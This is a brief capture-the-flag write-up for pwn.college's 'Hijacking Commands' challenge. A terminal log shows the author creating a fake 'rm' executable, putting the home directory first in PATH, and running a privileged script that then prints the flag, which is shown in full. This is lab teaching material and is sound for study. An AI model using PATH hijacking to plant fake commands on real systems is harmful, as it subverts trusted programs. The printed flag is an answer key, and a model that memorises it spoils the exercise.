# Hijacking Commands
This challenge asks us to change the `rm` in such way that it does not delete but prints the `/flag`
```bash
Connected!
hacker@path~hijacking-commands:~$ nano /challenge/run
hacker@path~hijacking-commands:~$ echo $PATH
/run/challenge/bin:/run/workspace/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
hacker@path~hijacking-commands:~$ ls /run/workspace/bin | grep rm
colrm
frm
ipcrm
normalizer
pyserial-miniterm
qemu-arm
qemu-armeb
qemu-system-arm
rm
rmdir
setterm
xfce4-terminal
hacker@path~hijacking-commands:~$ nano /run/workspace/bin/rm
hacker@path~hijacking-commands:~$ ls
COLLEGE  Desktop  PWN  instructions  log  myflag  n  not-the-flag  r  the-flag  win  win.sh  x.sh
hacker@path~hijacking-commands:~$ rm win
hacker@path~hijacking-commands:~$ rm win.sh; rm x.sh
hacker@path~hijacking-commands:~$ ls
COLLEGE  Desktop  PWN  instructions  log  myflag  n  not-the-flag  r  the-flag
hacker@path~hijacking-commands:~$ nano rm
hacker@path~hijacking-commands:~$ ls
COLLEGE  Desktop  PWN  instructions  log  myflag  n  not-the-flag  r  rm  the-flag
hacker@path~hijacking-commands:~$ chmod ugo+x rm
hacker@path~hijacking-commands:~$ PATH=/home/hacker:$PATH
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
Found 'rm' command at /home/hacker/rm. Executing!
pwn.college{c652HiCmlH8dtSVkQA53c5OIMcg.ddzNyUDLzQjN1czW}
hacker@path~hijacking-commands:~$
```
i made a duplicate file of `rm` and then gave its path in the begining so that bash reads that first then used `/challenge/run` command
